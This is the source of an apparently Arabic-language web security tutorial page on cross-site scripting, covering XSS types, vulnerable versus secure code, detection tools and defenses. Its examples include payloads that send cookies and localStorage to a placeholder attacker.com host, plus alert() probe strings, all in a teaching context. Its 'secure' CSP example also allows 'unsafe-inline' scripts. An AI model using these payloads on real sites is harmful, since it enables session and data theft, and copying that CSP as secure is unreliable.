import VulnerabilityLayout, { VulnSection, CodeBlock, InfoBox, ListItem } from '@/components/VulnerabilityLayout'
import VideoSection from '@/components/VideoSection'
import ToolsSection from '@/components/ToolsSection'
import LabsSection from '@/components/LabsSection'
import Quiz from '@/components/Quiz'
import ShareButtons from '@/components/ShareButtons'

export default function XssPage() {
  return (
    <VulnerabilityLayout
      icon="📜"
      titleAr="برمجة نصوص بين المواقع"
      titleEn="Cross-Site Scripting (XSS)"
      severity="high"
      owasp="A7:2021"
    >
      <ShareButtons title="XSS - برمجة نصوص بين المواقع" url="https://web-security-guide.vercel.app/vulnerabilities/xss" />

      <VulnSection title="تعريف XSS" icon="📖">
        <p style={{ color: '#cccccc', fontSize: '14px', lineHeight: '1.8' }}>
          برمجة نصوص بين المواقع (XSS) هي ثغرة أمنية تسمح للمهاجم بحقن أكواد JavaScript ضارة في صفحات الويب التي يراها المستخدمون الآخرون. يستخدم المهاجم هذه الثغرة لسرقة بيانات المستخدمين أو تشويه المواقع أو تثبيت برامج ضارة.
        </p>
        <p style={{ color: '#cccccc', fontSize: '14px', lineHeight: '1.8', marginTop: '8px' }}>
          تحدث XSS عندما تقوم تطبيقات الويب بعرض بيانات المستخدم دون تنقية كافية، مما يسمح للمهاجم بحقن أكواد ضارة يتم تنفيذها في متصفح الضحية.
        </p>
      </VulnSection>

      <VulnSection title="أنواع XSS" icon="🔍">
        <InfoBox type="info">
          <strong>1. XSS المنعكس (Reflected XSS)</strong> - يحدث عندما يتم حقن الكود الضار في طلب HTTP (مثل URL أو نموذج) ويتم عرضه في استجابة الخادم دون تنقية. يتطلب المهاجم إقناع الضحية بالنقر على رابط مغرض.
        </InfoBox>
        <CodeBlock title="مثال على رابط مغرض" code={`https://example.com/search?q=<script>document.location='https://attacker.com/steal?cookie='+document.cookie</script>

// عندما يفتح الضحية الرابط، يتم تنفيذ الكود الضار`} />

        <InfoBox type="warning">
          <strong>2. XSS المخزن (Stored XSS)</strong> - يحدث عندما يتم تخزين الكود الضار في قاعدة البيانات (مثل تعليقات أو منشورات) ويتم عرضه لكل مستخدم يزور الصفحة. هذا النوع أكثر خطورة لأنه لا يتطلب تفاعلاً من الضحية.
        </InfoBox>
        <CodeBlock title="مثال على تعليق مغرض" code={`<script>
  // كود لسرقة بيانات المستخدمين
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({
      cookies: document.cookie,
      localStorage: JSON.stringify(localStorage)
    })
  });
</script>

// إذا لم يتم تنقية التعليق، سيراه كل من يزور الصفحة`} />

        <InfoBox type="danger">
          <strong>3. DOM-based XSS</strong> - يحدث عندما يتم تعديل DOM بواسطة JavaScript في العميل دون تدخل الخادم. الكود الضار يتم حقنه في URL ويتم معالجته بواسطة JavaScript في الصفحة.
        </InfoBox>
        <CodeBlock title="مثال على DOM XSS" code={`// كود مصاب في الصفحة
const name = new URLSearchParams(window.location.search).get('name');
document.getElementById('greeting').innerHTML = 'مرحباً ' + name;

// مثال على URL مغرض
https://example.com/greeting?name=<img src=x onerror=alert('XSS')>`} />
      </VulnSection>

      <VulnSection title="أمثلة على الكود المصاب والمحصن" icon="💻">
        <CodeBlock title="❌ كود مصاب" variant="vulnerable" code={`// عرض تعليقات المستخدمين بدون تنقية
element.innerHTML = userInput;

// استخدام eval على مدخلات المستخدم
eval(userInput);

// إنشاء روابط ديناميكية من مدخلات المستخدم
element.href = "javascript:" + userInput;`} />

        <CodeBlock title="✅ كود محصن" variant="secure" code={`// استخدام textContent بدلاً من innerHTML
element.textContent = userInput;

// استخدام DOMPurify لتنقية HTML
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);

// استخدام CORS آمن
fetch('https://api.example.com/data', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-Requested-With': 'XMLHttpRequest'
  },
  credentials: 'same-origin'
});`} />
      </VulnSection>

      <VulnSection title="كيف تكتشف ثغرات XSS" icon="🔎">
        <h4 style={{ color: '#569cd6', fontSize: '13px', marginBottom: '8px' }}>علامات الضعف</h4>
        <ListItem>ظهور نوافذ منبثقة (alert) عند إدخال أكواد في النماذج</ListItem>
        <ListItem>تشويه الصفحة بعد إدخال أكواد HTML</ListItem>
        <ListItem>تنفيذ أكواد JavaScript غير متوقعة</ListItem>
        <ListItem>سرقة ملفات تعريف الارتباط (cookies)</ListItem>

        <h4 style={{ color: '#569cd6', fontSize: '13px', marginTop: '12px', marginBottom: '8px' }}>أدوات الاكتشاف</h4>
        <ListItem><strong>Burp Suite</strong> - أداة شاملة لاختبار أمن تطبيقات الويب</ListItem>
        <ListItem><strong>OWASP ZAP</strong> - أداة مجانية لاكتشاف الثغرات</ListItem>
        <ListItem><strong>XSStrike</strong> - أداة متخصصة في اكتشاف XSS</ListItem>
        <ListItem><strong>Dalfox</strong> - أداة سريعة لاكتشاف XSS</ListItem>

        <h4 style={{ color: '#569cd6', fontSize: '13px', marginTop: '12px', marginBottom: '8px' }}>أكواد اختبار XSS</h4>
        <CodeBlock title="Payloads للاختبار" code={`// أكواد اختبار XSS الأساسية
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<marquee onstart=alert('XSS')>
<details open ontoggle=alert('XSS')>`} />
      </VulnSection>

      <VulnSection title="طرق الحماية" icon="🛡️">
        <InfoBox type="success">
          <strong>1. تنقية المخرجات (Output Encoding)</strong> - تحوّل جميع الأحرف الخاصة إلى نظائرها الآمنة HTML قبل عرضها. هذا يمنع المتصفح من تفسير المدخلات ككود.
        </InfoBox>
        <CodeBlock title="دالة تنقية HTML" code={`// في JavaScript
function escapeHtml(text) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return text.replace(/[&<>"']/g, m => map[m]);
}

// استخدام الدالة
element.textContent = escapeHtml(userInput);`} />

        <InfoBox type="success">
          <strong>2. سياسة أمان المحتوى (CSP)</strong> - تحدد CSP المواقع المسموح بها لتحميل الموارد منها، مما يمنع تنفيذ أكواد JavaScript من مصادر غير موثوقة.
        </InfoBox>
        <CodeBlock title="إعداد CSP في Node.js/Express" code={`app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', [
    "default-src 'self'",
    "script-src 'self' 'unsafe-inline'",
    "style-src 'self' 'unsafe-inline'",
    "img-src 'self' data: https:",
    "font-src 'self'",
    "connect-src 'self'",
    "frame-ancestors 'none'"
  ].join('; '));
  next();
});`} />

        <InfoBox type="success">
          <strong>3. استخدام أطر عمل آمنة</strong> - أطر العمل الحديثة مثل React و Vue و Angular تقوم تنقية المخرجات تلقائياً. تجنب استخدام innerHTML.
        </InfoBox>
        <CodeBlock title="React - آمن بشكل افتراضي" code={`// React - آمن بشكل افتراضي
function UserComment({ text }) {
  // React ينقّي النص تلقائياً
  return <div>{text}</div>;
}

// لكن تجنب استخدام dangerouslySetInnerHTML
// إلا مع DOMPurify
import DOMPurify from 'dompurify';

function SafeHTML({ html }) {
  return (
    <div dangerouslySetInnerHTML={{
      __html: DOMPurify.sanitize(html)
    }} />
  );
}`} />

        <InfoBox type="success">
          <strong>4. HttpOnly Cookies</strong> - اجعل ملفات تعريف الارتباط الحساسة غير قابلة للوصول بواسطة JavaScript، مما يمنع سرقتها حتى في حالة وجود XSS.
        </InfoBox>
        <CodeBlock title="إعداد HttpOnly Cookie" code={`// في Node.js
res.cookie('sessionId', sessionId, {
  httpOnly: true,  // غير قابل للوصول من JavaScript
  secure: true,    // HTTPS فقط
  sameSite: 'strict',  // حماية CSRF
  maxAge: 24 * 60 * 60 * 1000  // يوم واحد
});`} />
      </VulnSection>

      <VulnSection title="نصائح أمنية" icon="💡">
        <InfoBox type="info">
          <strong>القاعدة الذهبية:</strong> لا تثق أبداً بمدخلات المستخدم
        </InfoBox>
        <ListItem>استخدم textContent بدلاً من innerHTML</ListItem>
        <ListItem>فعّل CSP (Content Security Policy) في خادمك</ListItem>
        <ListItem>استخدم أطر عمل آمنة مثل React أو Vue</ListItem>
        <ListItem>استخدم DOMPurify لتنقية HTML الديناميكي</ListItem>
        <ListItem>اجعل الكوكيز الحساسة HttpOnly و Secure</ListItem>
        <ListItem>راجع الكود بشكل دوري وقم باختبارات أمان</ListItem>
      </VulnSection>

      <VulnSection title="الأخطاء الشائعة" icon="⚠️">
        <InfoBox type="danger">
          <strong>❌ استخدام innerHTML مع مدخلات المستخدم</strong> - هذا يسمح بحقن أي كود HTML أو JavaScript
        </InfoBox>
        <InfoBox type="danger">
          <strong>❌ عدم تفعيل CSP</strong> - بدون CSP، يمكن تحميل أكواد من أي مصدر
        </InfoBox>
        <InfoBox type="danger">
          <strong>❌ استخدام eval() مع مدخلات المستخدم</strong> - يسمح بتنفيذ أي كود JavaScript عشوائي
        </InfoBox>
        <InfoBox type="danger">
          <strong>❌ عدم تنقية مخرجات البحث</strong> - صفحات البحث عادة ما تعكس مدخلات المستخدم مباشرة
        </InfoBox>
      </VulnSection>

      <section className="mb-6">
        <LabsSection slug="xss" />
      </section>

      <section className="mb-6">
        <ToolsSection slug="xss" />
      </section>

      <section className="mb-6">
        <Quiz slug="xss" />
        <VideoSection slug="xss" />
      </section>
    </VulnerabilityLayout>
  )
}
